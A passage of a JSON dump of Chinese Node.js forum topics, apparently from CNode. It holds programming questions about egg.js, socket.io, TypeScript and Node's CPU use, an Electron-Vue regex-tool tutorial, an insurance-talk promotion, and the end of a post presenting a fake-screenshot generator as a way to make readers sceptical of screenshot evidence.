、<code>各种新闻站</code>…</p>\n<p>如果那些截屏内容只涉及到段子还好，但多数情况不是。它们往往和某事/某人有关，这（假截图）就<strong>极有可能</strong>导致人们对该事/人产生错误的看法（之所以说错误，是因为我认为<strong>大多数</strong>虚假截图的制作者都怀有不良动机。）</p>\n<p>再加上<strong>多数人并不会去主动验证该截图描述事情的真伪</strong>，这是“虚假截图”泛滥的重要原因之一。</p>\n<blockquote>\n<p>为什么人们普遍不会去验证截图内容的真伪？</p>\n<p>答案很简单：难。（人们每天接受的信息量太多，但验证某条信息的真伪很难。）</p>\n</blockquote>\n<p>所以我就想，作为一个程序员，我能为此做些什么？</p>\n<p>然后联想到了之前的<strong>一些事儿：</strong></p>\n<p><strong>1</strong></p>\n<p>之前还常玩知乎的时候，凑过不少“热闹”。</p>\n<p>我发现了一个现象：<strong>如果某答主在发表对某事的看法时，附带了截图的话，那么往往就能吸引不少“赞同”。</strong> 因为人们下意识地认为“既然都有截图，那么情况十有八九就是这样吧”。</p>\n<p>好（wu）玩（yu）的是，有两次我还专门撰写了答案，用我伪造的一些荒唐的截图（让人一看就觉得是假的）来提醒其他用户：不要轻易相信高赞答主提供的“所谓截图证据”。</p>\n<p>但是…</p>\n<p>我的回答迅速淹没在洪流中，沉了…</p>\n<p>当时，<strong>我的心情是复杂的…</strong></p>\n<p><strong>2</strong></p>\n<p>我基本每天都会上网，也有在不同渠道看新闻的习惯。当我看到一些明显真实性存疑的东西被广泛传播时，我就很烦，想骂人，想质问他们转发前为什么不先自己去证实下真伪？</p>\n<p>但理智地讲，我也非常清楚：<strong>“现实就是这样。因为现在人们每天接受的信息太多，且求证的难度也太高，所以就极少会有人去求证”。</strong> 这个事实很让人沮丧。</p>\n<p>我最先想到的其实并不是<a href=\"https://github.com/thegreatjavascript/FakeScreenshot\">「虚假截图制作工具/FakeScreenshot」</a>项目。</p>\n<p>而是运营一个专门替别人“求证”某事真实性的微博账户。当然，也不是所有的事情我都可以“搞定”，毕竟我只是一个没有什么社会能量的普通程序员，但仍旧有一些事情我可以求证出来。不过因为近期时间已经被其他事情占用了，因此这个想法一直没有去实施。</p>\n<p>后面我才想到了这个“灵感”（貌似是和别人斗图的时候？:p ）：何不做一个“伪造截图”的网站，<strong>这样任何知道此网站存在的人，心里都会明白这么一件事：“哦，原来各大网站截图都是可以轻易伪造的啊”。这样当他再次看到其他截图的时候，会想起来此网站的存在，然后就会下意识地怀疑截图的真实性了。</strong></p>\n<blockquote>\n<p>有朋友说这是：用“造假”来对抗造假。</p>\n<p>是的，它是！</p>\n</blockquote>\n</div>","title":"对抗假消息：虚假截图制作工具","last_reply_at":"2019-04-09T09:31:50.190Z","good":false,"top":false,"reply_count":8,"visit_count":1278,"create_at":"2019-03-24T10:14:06.578Z","author":{"loginname":"shuiRong","avatar_url":"https://avatars1.githubusercontent.com/u/16076993?v=4&s=120"}},{"id":"5cabff7c7edd13064e053a00","author_id":"59e4bc6b61932717683d23d7","tab":"ask","content":"<div class=\"markdown-text\"><p>egg-core里的egg_loader.js的\ngetServerEnv方法报错</p>\n<p>上一次遇到这个问题，我是通过把依赖删掉重下 来解决的  这次无效</p>\n<p>我不知道该如何解决了，有人知道这是怎么回事嘛，或者指个方向？\n谢谢了\n<img src=\"//static.cnodejs.org/Flwm8_n3gkbKq8gs4J5lKtPj2V-Z\" alt=\"屏幕快照 2019-04-09 上午9.49.40.png\">\n<img src=\"//static.cnodejs.org/Fv3CgTlPYTPWblukfPl6ZIZEJgN5\" alt=\"屏幕快照 2019-04-09 上午10.02.05.png\"></p>\n</div>","title":"请求帮助 使用vscode调试egg.js 报错 ’config/env‘ file not exist","last_reply_at":"2019-04-09T09:03:23.070Z","good":false,"top":false,"reply_count":2,"visit_count":286,"create_at":"2019-04-09T02:12:12.268Z","author":{"loginname":"Benny233","avatar_url":"https://avatars0.githubusercontent.com/u/12774730?v=4&s=120"}},{"id":"5ca4384e31010b2dfbb42a6b","author_id":"5ca1a9666c1de62dce4667d7","tab":"ask","content":"<div class=\"markdown-text\"><p>初学node，听说他是单线程的，只能使用一个核心，如果CPU是多核心的，那么只能用一个核心，其他核心无法使用。对吧？</p>\n<p>发现了一个问题。本来是想看看精确计时的问题，但是在死循环的时候，看了一下CPU的使用情况，发现四个核心都利用起来了。\n反复试验了几次都是这样，没有其他软件运行。不知道是怎么回事。</p>\n<blockquote>\n<p>var i=0;\nvar j=0;</p>\n</blockquote>\n<p>var star = (new Date()).getTime();  //普通计时\nvar star2 = time();  //精确计时\nvar star3 = time();  //精确计时</p>\n<p>while (true){\ni++;j++;</p>\n<pre class=\"prettyprint\"><code>var t = time() - star2;\nvar msg = i + &#x27;_&#x27; + (new Date()).getTime() + &#x27;_&#x27; + time() + &#x27;_&#x27; +t;\n&#x2F;&#x2F;计算每循环100次需要的时间，运行结果可得，时间并不一致\nif (j==100){\n    var t2 = (new Date()).getTime() - star;\n    var t3 = time() - star3;\n    console.log(msg + &#x27;_&#x27; + t2+ &#x27;_&#x27; + t3); &#x2F;&#x2F;每百次用时\n    star = (new Date()).getTime();\n    star3 = time();\n    j=0;\n}\nelse {\n    console.log(msg);\n}\n\nstar2 = time();\n</code></pre><p>}\nfunction time(){\nvar diff = process.hrtime();\nreturn diff[0] * 1000 + diff[1] / 1e6; // nano second -&gt; ms</p>\n<p>}</p>\n<p><img src=\"//static.cnodejs.org/FgQ2pWQIjYgzNYTGpxGjbV4YePfS\" alt=\"time10.png\"></p>\n<p>开始运行，四个核的使用率都上来了，关闭运行，四个核的使用率都下来了。</p>\n<p>是不是我理解错了？</p>\n</div>","title":"不是说node不能利用多核心CPU吗？","last_reply_at":"2019-04-09T07:53:00.135Z","good":false,"top":false,"reply_count":27,"visit_count":1555,"create_at":"2019-04-03T04:36:30.928Z","author":{"loginname":"jyk0011","avatar_url":"https://avatars0.githubusercontent.com/u/6062713?v=4&s=120"}},{"id":"5c9aefaafd41137eb7662373","author_id":"57cb8e015f7f910c27696d6f","tab":"share","content":"<div class=\"markdown-text\"><p>这是由 Electron &amp; Vue.js 编写的，为程序员服务的编程工具</p>\n<p>目前提供了四个版块：</p>\n<ul>\n<li>正则表达式</li>\n<li>时间戳转化</li>\n<li>颜色盒子</li>\n<li>Json 转化</li>\n</ul>\n<p>在这几个模块中，可以发现使用组件化的好处，处理多个组件之间各种数据变化非常方便。\n当然这里面很多转化都是自己造轮子。。。\n<img src=\"https://github.com/TsaiKoga/it-tools/raw/master/src/renderer/assets/IT-Tools-preview.gif\" alt=\"IT Tools\"></p>\n<h2>项目地址：</h2>\n<p>Github 地址：<a href=\"https://github.com/TsaiKoga/it-tools\">https://github.com/TsaiKoga/it-tools</a></p>\n<h2>求 Star</h2>\n<p>感兴趣的朋友可以 star 或 fork，或是给我你的宝贵意见，互相学习一下</p>\n<p>下面介绍一下我写 正则表达式内容，写的不好，望见谅…</p>\n<h3>下载 electron-vue</h3>\n<p>克隆项目，从 electron-vue 克隆项目，然后开始编写代码；</p>\n<pre class=\"prettyprint\"><code>git clone https:&#x2F;&#x2F;github.com&#x2F;SimulatedGREG&#x2F;electron-vue.git\n</code></pre><p>通过&quot;正则表达式&quot;这个模块，来了解 Vue 组件通信；</p>\n<p>electron-vue 一开始已经为你生成一些文件页面，我们可以按照他的方法创建我们自己的页面；</p>\n<h3>创建路由：</h3>\n<p>src/renderer/router/index.js 文件中添加路由：</p>\n<pre class=\"prettyprint language-js\"><code>export default new Router({\n  routes: [\n    {\n      path: &#x27;&#x2F;&#x27;,\n      name: &#x27;landing-page&#x27;,\n      component: require(&#x27;@&#x2F;components&#x2F;LandingPage&#x27;).default\n    },\n    {\n      path: &#x27;&#x2F;regex-page&#x27;,\n      name: &#x27;regex-page&#x27;,\n      component: require(&#x27;@&#x2F;components&#x2F;RegexPage&#x27;).default\n    }\n]\n});\n</code></pre><p>这里我们的 url 为 /regex-page，并且 require 了 RegexPage 组件，这个组件要放置在 components 目录下，所以我创建了文件：src/renderer/components/RegexPage.vue</p>\n<h4>编写组件：</h4>\n<p>可以通过复制 LandingPage.vue 组件，将它改成新组件即可：</p>\n<p>要实现这个页面，头部两个输入框，输入后都能与下面的 textarea 内容进行比较处理，得出结论；</p>\n<p>这个用 组件化 vue 比纯粹用 js jquery 的 dom 操作要方便太多了；</p>\n<p>通过 template 包裹写成 vue 组件：</p>\n<pre class=\"prettyprint\"><code>&lt;template&gt;\n  &lt;div id=&quot;regex-page&quot;&gt;\n　　　　&lt;div class=&quot;regex-inner&quot; v-show=&quot;currentTab === &#x27;Home&#x27;&quot;&gt;\n        　　　　&lt;div class=&quot;regex-top&quot;&gt;\n          　　　　　　&lt;div class=&quot;regex-top-label&quot;&gt;\n            　　　　　　　　&lt;label&gt;Your regular expression:&lt;&#x2F;label&gt;\n          　　　　　　&lt;&#x2F;div&gt;\n          　　　　　　&lt;div class=&quot;regex-top-fields&quot;&gt;\n            　　　　　　　　&lt;div class=&quot;regex-diagonal&quot;&gt;&#x2F;&lt;&#x2F;div&gt;\n            　　　　　　　　&lt;div class=&quot;regex-diagnoal-input&quot;&gt;\n              　　　　　　　　　　&lt;input type=&quot;text&quot; name=&quot;regex-exp&quot; @input=&#x27;execRegex&#x27; :value=&#x27;regexExp&#x27; &#x2F;&gt;\n            　　　　　　　　&lt;&#x2F;div&gt;\n\n 　　　　　　　　&lt;div class=&quot;regex-diagonal&quot;&gt;&#x2F;&lt;&#x2F;div&gt;\n            　　　　　　　　&lt;div&gt;\n              　　　　　　　　　　&lt;input type=&quot;text&quot; name=&quot;regex-opt&quot; @input=&quot;execRegex&quot; :value=&quot;regexOpt&quot; &#x2F;&gt;\n            　　　　　　　　&lt;&#x2F;div&gt;\n          　　　　　　&lt;&#x2F;div&gt;\n        　　　　　&lt;&#x2F;div&gt;\n\n 　　　　　&lt;div class=&quot;regex-bottom&quot;&gt;\n          　　　　　　&lt;div class=&quot;regex-content&quot;&gt;\n            　　　　　　　　&lt;label&gt;Your test string: &lt;&#x2F;label&gt;\n            　　　　　　　　&lt;textarea class=&quot;regex-textarea&quot; name=&quot;regex-content&quot; @input=&quot;execRegex&quot; :value=&#x27;regexCont&#x27;&gt;&lt;&#x2F;textarea&gt;\n          　　　　　　&lt;&#x2F;div&gt;\n\n 　　　　　　&lt;div class=&quot;result-content result-init&quot; v-if=&quot;regexResult[&#x27;status&#x27;] == 0&quot;&gt;\n            　　　　　　　　{{ regexResult[&#x27;content&#x27;] }}\n          　　　　　　&lt;&#x2F;div&gt;\n\n\n          　　　　　　&lt;div class=&quot;result-content result-match&quot; v-if=&quot;regexResult[&#x27;status&#x27;] == 1&quot;&gt;\n            　　　　　　　　&lt;div&gt;\n              　　　　　　　　　　&lt;div class=&quot;regex-match-btn&quot;&gt;\n                　　　　　　　　　　　　&lt;label&gt;Match Result:&lt;&#x2F;label&gt;\n                　　　　　　　　　　　　&lt;a href=&quot;javascript:void(0)&quot; class=&quot;clean-fields&quot; @click=&quot;cleanAllFields&quot;&gt;Clean Fields&lt;&#x2F;a&gt;\n              　　　　　　　　　　&lt;&#x2F;div&gt;\n              　　　　　　　　　　&lt;div class=&quot;result-item&quot;&gt;\n　　　　　　　　　　　　&lt;span v-for=&quot;(cont, indx) in regexResult[&#x27;matchedContext&#x27;]&quot; :class=&quot;indx%2 !== 0 ? &#x27;match&#x27; : null&quot;&gt;{{ cont }}&lt;&#x2F;span&gt;\n              　　　　　　　　　　&lt;&#x2F;div&gt;\n            　　　　　　　　&lt;&#x2F;div&gt;\n            　　　　　　　　&lt;ul v-if=&quot;regexResult[&#x27;content&#x27;].length &gt; 0&quot;&gt;\n              　　　　　　　　　　&lt;label&gt;Match Groups:&lt;&#x2F;label&gt;\n              　　　　　　　　　　&lt;div class=&quot;match-groups&quot;&gt;\n                　　　　　　　　　　　　&lt;li v-for=&quot;(itemGroup, index) in regexResult[&#x27;content&#x27;]&quot;&gt;\n                  　　　　　　　　　　　　　　&lt;div class=&quot;group-item&quot;&gt;\n                    　　　　　　　　　　　　　　&lt;label&gt;Match Group {{ index + 1 }}:&lt;&#x2F;label&gt;\n                    　　　　　　　　　　　　　　&lt;ul&gt;\n                      　　　　　　　　　　　　　　　　&lt;li v-if=&quot;i !== 0&quot; v-for=&quot;(item, i) in itemGroup&quot;&gt;{{ i }}: {{ item }}&lt;&#x2F;li&gt;\n                    　　　　　　　　　　　　　　&lt;&#x2F;ul&gt;\n                  　　　　　　　　　　　　　　&lt;&#x2F;div&gt;\n                　　　　　　　　　　　　&lt;&#x2F;li&gt;\n              　　　　　　　　　　&lt;&#x2F;div&gt;\n            　　　　　　　　&lt;&#x2F;ul&gt;\n          　　　　　　　　&lt;&#x2F;div&gt;\n\n 　　　　　　　　&lt;div class=&quot;result-content result-not-match&quot; v-if=&quot;regexResult[&#x27;status&#x27;] == -1&quot;&gt;\n            　　　　　　　　　　{{ regexResult[&#x27;content&#x27;] }}\n          　　　　　　　　&lt;&#x2F;div&gt;\n        　　　　　　&lt;&#x2F;div&gt;\n      　　　　&lt;&#x2F;div&gt;\n&lt;&#x2F;div&gt;\n&lt;&#x2F;template&gt;\n\n&lt;script&gt;\nimport { mapState, mapActions } from &#x27;vuex&#x27;\n\nexport default {\n  name: &#x27;regex-page&#x27;,\n  computed: {\n    ...mapState(&#x27;Regex&#x27;, {\n      regexExp: state =&gt; state.regexExp,\n      regexOpt: state =&gt; state.regexOpt,\n      regexCont: state =&gt; state.regexCont,\n      regexResult: state =&gt; state.regexResult})\n  },\n\n    methods: {\n    ...mapActions(&#x27;Regex&#x27;, [\n      &#x27;setNav&#x27;,\n      &#x27;cleanFields&#x27;,\n      &#x27;regexMatch&#x27;\n    ]),\n    cleanAllFields () {\n      this.cleanFields()\n    },\n    execRegex (event) {\n      this.regexMatch(event)\n    },\n    updateNav (title, index) {\n      this.setNav({ title: title, index: index })\n    }\n\n  }\n\n}\n&lt;&#x2F;script&gt;\n&lt;style lang=&quot;scss&quot; scoped&gt;\n * {\n\n  }\n&lt;&#x2F;style&gt;\n</code></pre><p>至于，输入框之间的交互，我使用 vuex 来实现他们之间数据的传递；</p>\n<h3>使用 Vuex 管理状态：</h3>\n<p><strong>一、创建 store 目录，并创建 modules 目录用来管理不同的命名空间的 State, Actions, Mutations 创建 src/renderer/store/modules/Regex.js 文件</strong>：</p>\n<pre class=\"prettyprint\"><code>const state = {\n  regexExp: &#x27;&#x27;,\n  regexOpt: &#x27;&#x27;,\n  regexCont: &#x27;&#x27;,\n  regexResult: { status: 0, content: &quot;Here&#x27;s result.&quot; }\n}\n\nconst mutations = {\n  REGEX_MATCH (state, target) {\n    if (target.name === &#x27;regex-exp&#x27;) {\n      state.regexExp = target.value\n    }\n    if (target.name === &#x27;regex-opt&#x27;) {\n      state.regexOpt = target.value\n    }\n    if (target.name === &#x27;regex-content&#x27;) {\n      state.regexCont = target.value\n    }\n    ...\n}\n\n\nconst actions = {\n  cleanFields ({ commit }) {\n    commit(&#x27;CLEAN_FIELDS&#x27;)\n  },\n  regexMatch ({ commit }, payload) {\n    commit(&#x27;REGEX_MATCH&#x27;, payload.target)\n  }\n}\n\n\nexport default {\n  state,\n  mutations,\n  actions\n}\n</code></pre><p>state 给默认状态；</p>\n<p>mutations 更改对应 state ；</p>\n<p>actions 用于写异步来改变状态或提交 mutations 的更改；</p>\n<p>state 的方法被我写在 computed，这样组件中可以使用；</p>\n<p>在 methods 方法中使用 mapActions，并定义其他方法来调用这些 action ；</p>\n<p><strong>二、main.js 加入 store 容器</strong></p>\n<pre class=\"prettyprint language- js\"><code>import App from &#x27;.&#x2F;App&#x27;\nimport router from &#x27;.&#x2F;router&#x27;\nimport store from &#x27;.&#x2F;store&#x27;\n\nif (!process.env.IS_WEB) Vue.use(require(&#x27;vue-electron&#x27;))\nVue.http = Vue.prototype.$http = axios\nVue.config.productionTip = false\n\nnew Vue({\n  components: { App },\n  router,\n  store,\n  template: &#x27;&lt;App&#x2F;&gt;&#x27;\n}).$mount(&#x27;#app&#x27;)\n</code></pre><p><strong>三、组件中通过 computed 或 data 使用 State，通过 methods 触发 Actions 方法</strong></p>\n<pre class=\"prettyprint language- js\"><code>import { mapState, mapActions } from &#x27;vuex&#x27;\n\nexport default {\n  name: &#x27;regex-page&#x27;,\n  computed: {\n    ...mapState(&#x27;Regex&#x27;, {\n      regexExp: state =&gt; state.regexExp,\n      regexOpt: state =&gt; state.regexOpt,\n      regexCont: state =&gt; state.regexCont,\n      regexResult: state =&gt; state.regexResult})\n    },\n\n    methods: {\n    ...mapActions(&#x27;Regex&#x27;, [\n      &#x27;setNav&#x27;,\n      &#x27;cleanFields&#x27;,\n      &#x27;regexMatch&#x27;\n    ]),\n    cleanAllFields () {\n      this.cleanFields()\n    },\n    execRegex (event) {\n      this.regexMatch(event)\n    },\n    updateNav (title, index) {\n      this.setNav({ title: title, index: index })\n    }\n\n  }\n}\n</code></pre><p>在组件文件中引用了</p>\n<p>mapState, mapActions 方法，他可以获取这个 store 里的 state 和 action 方法，</p>\n<p>不过要注意命名空间的使用，此处使用了 Regex 作为命名空间，所以要在 mapState 和 mapActions 中加 命名空间；</p>\n<p>命名空间定义文件在：src/renderer/store/modules/index.js 文件；</p>\n<pre class=\"prettyprint language- js\"><code>const files = require.context(&#x27;.&#x27;, false, &#x2F;\\.js$&#x2F;)\nconst modules = {}\n\nfiles.keys().forEach(key =&gt; {\n  if (key === &#x27;.&#x2F;index.js&#x27;) return\n  modules[key.replace(&#x2F;(\\.\\&#x2F;|\\.js)&#x2F;g, &#x27;&#x27;)] = files(key).default\n  modules[key.replace(&#x2F;(\\.\\&#x2F;|\\.js)&#x2F;g, &#x27;&#x27;)][&#x27;namespaced&#x27;] = true\n})\n\nexport default modules\n</code></pre><p>但是直接 (‘ Regex ’, [regexExp: state =&gt; state.regexExp]) 是无法使用的，必须在 module 中声明 namespaced: true 才可以；</p>\n<p>… mapActions() 是将里面的对象 扁平化 到 外面的对象中；</p>\n<p>直接 mapActions 只是打开了方法，还未执行：</p>\n<p>删除 createSharedMutations() 的方法后，action 生效；</p>\n<p><strong>绑定到组件上</strong></p>\n<pre class=\"prettyprint\"><code>&lt;input type=&quot;text&quot; name=&quot;regex-exp&quot; @input=&#x27;execRegex&#x27; value=&#x27;regexExp&#x27; &#x2F;&gt;\n</code></pre><h3>生成桌面应用</h3>\n<p>运行命令：</p>\n<pre class=\"prettyprint language- sh\"><code>npm run build:mas # 生成 mac 应用\nnpm run build:linux # 生成 linux 应用\nnpm run build:win32 # 生成 windows 应用\n</code></pre><p>可以在 /build 目录中看到生成的应用目录</p>\n</div>","title":"使用 Electron-Vue 开发的协助程序员的开发工具 IT-Tools","last_reply_at":"2019-04-09T06:10:30.846Z","good":false,"top":false,"reply_count":2,"visit_count":702,"create_at":"2019-03-27T03:36:10.182Z","author":{"loginname":"TsaiKoga","avatar_url":"https://avatars1.githubusercontent.com/u/5005072?v=4&s=120"}},{"id":"5cab4e217edd13064e053791","author_id":"5cab4dba7edd13064e05378e","tab":"ask","content":"<div class=\"markdown-text\"><p>在egg中加入egg-sequelize后，npm run dev报错，尝试过很多次，也换过数据库，都报错\n请问这是什么问题</p>\n<blockquote>\n<p>2019-04-08 21:22:18,797 ERROR 12252 nodejs.AgentWorkerDiedError: [master] agent_worker#1:10556 died (code: 1, signal: null)\nat Master.onAgentExit (F:\\MX\\MX_0.2\\node_modules\\egg-cluster\\lib\\master.js:341:17)\nat Master.emit (events.js:182:13)\nat Messenger.sendToMaster (F:\\MX\\MX_0.2\\node_modules\\egg-cluster\\lib\\utils\\messenger.js:137:17)\nat Messenger.send (F:\\MX\\MX_0.2\\node_modules\\egg-cluster\\lib\\utils\\messenger.js:102:12)\nat ChildProcess.agentWorker.once (F:\\MX\\MX_0.2\\node_modules\\egg-cluster\\lib\\master.js:232:22)\nat Object.onceWrapper (events.js:273:13)\nat ChildProcess.emit (events.js:182:13)\nat Process.ChildProcess._handle.onexit (internal/child_process.js:240:12)\nname: &quot;AgentWorkerDiedError&quot;\npid: 12252\nhostname:</p>\n</blockquote>\n</div>","title":"在egg框架中加入egg-sequelize后报错","last_reply_at":"2019-04-09T04:21:00.681Z","good":false,"top":false,"reply_count":3,"visit_count":332,"create_at":"2019-04-08T13:35:29.666Z","author":{"loginname":"praeteritis","avatar_url":"https://avatars3.githubusercontent.com/u/12553751?v=4&s=120"}},{"id":"5cabfe75d68ff5064921b4a0","author_id":"52cce7827a15a38466a94b4b","tab":"share","content":"<div class=\"markdown-text\"><p>程序员是一个整体偏理性的群体，凡事都喜欢问个 Why\\How\\What？但是因为种种原因，我发现身边很多同事朋友对【保险】这件事的认识比少，或者存在一些思想误区。我个人从两年前开始关注保险行业，经过持续的学习和认识，发现保险对于绝大多数个人和家庭来说都是非常重要的一项资产配置，我自己也在过去的一年中逐步完成了个人保险配置。本期 Chat 就将为大家分享关于个人和家庭保险配置的相关知识。</p>\n<p>本场 Chat 的主要内容有：</p>\n<p>Why：保险对于个人及家庭的意义\nHow：各个险种的保障作用、适用场景、配置思路\nWhat： 个人买保险的途径、购买过程需要关注点、购买过程不需要关注的点\n理论上本次 Chat 适合所有人，无论有没有兴趣，多了解一些总归是好的。</p>\n<p><img src=\"https://refined-x.com/asset/a/insurance-configuration.jpg\" alt></p>\n</div>","title":"奋斗路上的安全边际，程序员保险配置指南","last_reply_at":"2019-04-09T03:39:53.821Z","good":false,"top":false,"reply_count":3,"visit_count":570,"create_at":"2019-04-09T02:07:49.819Z","author":{"loginname":"tower1229","avatar_url":"https://avatars1.githubusercontent.com/u/4016839?v=4&s=120"}},{"id":"5c949d11fd41137eb76608ab","author_id":"580f6fcab37ee8fb339787ea","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FgUfHkjYr6VWmRR044Mwp9SvZaz6\" alt=\"image.png\"></p>\n</div>","title":"cnpm最近两天是炸了么？？？","last_reply_at":"2019-04-09T02:08:07.579Z","good":false,"top":false,"reply_count":11,"visit_count":1254,"create_at":"2019-03-22T08:30:09.721Z","author":{"loginname":"lzq920","avatar_url":"https://avatars0.githubusercontent.com/u/37999725?v=4&s=120"}},{"id":"5c9c671f484eeb3634157e41","author_id":"5aef3aa30a36e5312d6ecd82","tab":"ask","content":"<div class=\"markdown-text\"><h3>需求</h3>\n<p>有一个 HTTP 接口 A，后端会执行一段异步任务\n发一个 HTTP 请求到 B 站点，B 站点异步执行后 callback A 站点的 HTTP 接口。</p>\n<p>我想客户端请求的时候阻塞一下 A &lt;—&gt; B 这个过程，让客户端使用 A 的时候基本无感，有没有什么比较好的处理方案？</p>\n<h3>现有方案</h3>\n<p>标记每一个请求，A 接口上轮询等待 B 接口的返回结果。有其他更好的事件流或者闭包处理方案吗？\n伪代码</p>\n<pre class=\"prettyprint language-js\"><code>const POOL = {}\nfunction sleep(timer = 100) {\n  return new Promise(resolve =&gt; {\n    setTimeout(resolve, timer)\n  })\n}\n\n&#x2F;&#x2F; 客户端请求的接口\nasync function handle(ctx) {\n  const tid = Math.random().toString()\n  await axios.post(&#x27;xxx&#x27;, { tid })\n  POOL[tid] = null\n  for (let i = 0; i &lt;= 100; i++) {\n    &#x2F;&#x2F; 轮询 POOL 有没有返回值\n    if (POOL[tid]) {\n\t   break\n\t}\n    await sleep()\n  }\n  const res = POOL[tid]\n  if (!res) {\n    ctx.throw(500)\n  }\n  ctx.body = res\n}\n\nasync function callback() {\n  const { tid, payload } = ctx.request.body\n  if (POOL[tid] !== undefined) {\n    POOL[tid] = payload\n  }\n  ctx.body = &#x27;ok&#x27;\n}\n\n</code></pre></div>","title":"HTTP 请求异步资源，后端阻塞等待怎么高效实现？","last_reply_at":"2019-04-09T02:01:47.620Z","good":false,"top":false,"reply_count":8,"visit_count":566,"create_at":"2019-03-28T06:18:07.155Z","author":{"loginname":"wiviwiv","avatar_url":"https://avatars0.githubusercontent.com/u/25006774?v=4&s=120"}},{"id":"5cabf7cb7edd13064e053944","author_id":"5c2e23963898674067a7ae2b","tab":"ask","content":"<div class=\"markdown-text\"><p>相关 issue <a href=\"https://github.com/Microsoft/TypeScript/issues/2873\">https://github.com/Microsoft/TypeScript/issues/2873</a></p>\n<p>我目前的解决方法是手动给返回结果标注类型。</p>\n<pre class=\"prettyprint\"><code>interface TypedCommonStorageInterface {\n  &#x2F;** --------图床--------- *&#x2F;\n\n  addImageHosting(imageHosting: ImageHosting): Promise&lt;ImageHosting[]&gt;;\n\n  getImageHosting(): Promise&lt;ImageHosting[]&gt;;\n}\n\n\ntype PromiseType&lt;T extends Promise&lt;any&gt;&gt; = T extends Promise&lt;infer U&gt;\n  ? U\n  : never;\n\n   const imageHostingList: PromiseType&lt;\n      ReturnType&lt;typeof storage.addImageHosting&gt;\n    &gt; = yield call(storage.addImageHosting, imageHosting);\n</code></pre></div>","title":"redux-saga 在用 typescript 开发时 call 的返回值类型怎么确定？","last_reply_at":"2019-04-09T01:39:23.857Z","good":false,"top":false,"reply_count":0,"visit_count":275,"create_at":"2019-04-09T01:39:23.857Z","author":{"loginname":"DiamondYuan","avatar_url":"https://avatars1.githubusercontent.com/u/9692408?v=4&s=120"}},{"id":"5cab18b97edd13064e053649","author_id":"590a90375bb7efe417431fd4","tab":"ask","content":"<div class=\"markdown-text\"><p><a href=\"http://socket.io\">socket.io</a> 先合界面连接成功了，然后登录网站，把用户信息放进 session，但是 socket.request.session 中还是原来的值，并没有后面添加的用户信息。这个如何解决。\nnodejs 代码如下</p>\n<pre class=\"prettyprint\"><code>const io = require(&#x27;socket.io&#x27;).listen(&#x27;8082&#x27;, { origins: &#x27;*&#x27; })\nconst schedule = require(&#x27;node-schedule&#x27;)\n\nio.set(&#x27;transports&#x27;, [\n  &#x27;websocket&#x27;,\n  &#x27;flashsocket&#x27;,\n  &#x27;htmlfile&#x27;,\n  &#x27;xhr-polling&#x27;,\n  &#x27;jsonp-polling&#x27;,\n  &#x27;polling&#x27;\n])\nio.set(&#x27;origins&#x27;, &#x27;*:*&#x27;)\n\nconst app = new express()\n\nconst sessionStore = new session.MemoryStore({ reapInterval: 3600 * 1000 })\nconst sessionMiddleware = session({\n    secret: &#x27;Stefanie Sun&#x27;,\n    store: sessionStore,\n    resave: false, &#x2F;&#x2F; 强制更新 session\n    saveUninitialized: true,  &#x2F;&#x2F; \n    cookie: { \n        maxAge: 8 * 3600 * 1000,  &#x2F;&#x2F; 过期时 8 小时\n        secure: false &#x2F;&#x2F; http 访问时 secure 为 false\n  }, \n    rolling: true\n})\nio.use((socket, next) =&gt; {\n  sessionMiddleware(socket.request, socket.request.res, next);\n})\napp.use(sessionMiddleware)\nroutes(app)\n\nio.on(&#x27;connection&#x27;, (socket) =&gt; {\n  const comment_schedule = schedule.scheduleJob(&#x27;*&#x2F;10 * * * * *&#x27;, async () =&gt; {         &#x2F;** 10s查询一次是否有新的内容 **&#x2F;\n    const COOKIE_STR = socket.request.session\n    console.log(COOKIE_STR)\n  })\n})\n</code></pre><p>是否必须要登录之后再连接才能获取呢。</p>\n</div>","title":"socket.io 中的 socket.request.session 无法获取连接成功之后设置的 session","last_reply_at":"2019-04-08T09:47:37.981Z","good":false,"top":false,"reply_count":0,"visit_count":248,"create_at":"2019-04-08T09:47:37.981Z","author":{"loginname":"hellomrbigshot","avatar_url":"https://avatars1.githubusercontent.com/u/16463481?v=4&s=120"}},{"id":"5cab0f9dd68ff5064921b046","author_id":"5cab0e857edd13064e0535a4","tab":"ask","content":"<div class=\"markdown-text\"><p>import { PopupSelect } from ‘<a href=\"/user/atlaskit\">@atlaskit</a>/select’;\n**提示的信息：**module &quot;e:/mygit/atlassian-organizer-4-8/atlassian-organizer/node_modules/<a href=\"/user/atlaskit\">@atlaskit</a>/select/dist/cjs/index&quot;\n无法找到模块“<a href=\"/user/atlaskit\">@atlaskit</a>/select”的声明文件。“e:/mygit/atlassian-organizer-4-8/atlassian-organizer/node_modules/<a href=\"/user/atlaskit\">@atlaskit</a>/select/dist/cjs/index.js”隐式拥有 “any” 类型。\nTry <code>npm install @types/atlaskit__select</code> if it exists or add a new declaration (.d.ts) file containing <code>declare module '[@atlaskit](/user/atlaskit)/select';</code>ts(7016)\n无法找到模块“<a href=\"/user/atlaskit\">@atlaskit</a>/select”的声明文件。“e:/mygit/atlassian-organizer-4-8/atlassian-organizer/node_modules/<a href=\"/user/atlaskit\">@atlaskit</a>/select/dist/cjs/index.js”隐式拥有 “any” 类型。\nTry <code>npm install @types/atlaskit__select</code> if it exists or add a new declaration (.d.ts) file containing <code>declare module '[@atlaskit](/user/atlaskit)/select';</code>ts(7016)\n无法找到模块“<a href=\"/user/atlaskit\">@atlaskit</a>/select”的声明文件。“e:/mygit/atlassian-organizer-4-8/atlassian-organizer/node_modules/<a href=\"/user/atlaskit\">@atlaskit</a>/select/dist/cjs/index.js”隐式拥有 “any” 类型。\n按照官方的文档引用的 链接：<a href=\"https://atlaskit.atlassian.com/packages/core/select/example/popup-select\">https://atlaskit.atlassian.com/packages/core/select/example/popup-select</a></p>\n</div>","title":"无法找到模块@atlaskit/select","last_reply_at":"2019-04-08T09:43:17.291Z","good":false,"top":false,"reply_count":1,"visit_count":238,"create_at":"2019-04-08T09:08:45.383Z","author":{"loginname":"TheBigP","avatar_url":"https://avatars2.githubusercontent.com/u/33213320?v=4&s=120"}},{"id":"5caaf1737edd13064e05346c","author_id":"5a0d348fe2f4b8ea22496498","tab":"share","content":"<div 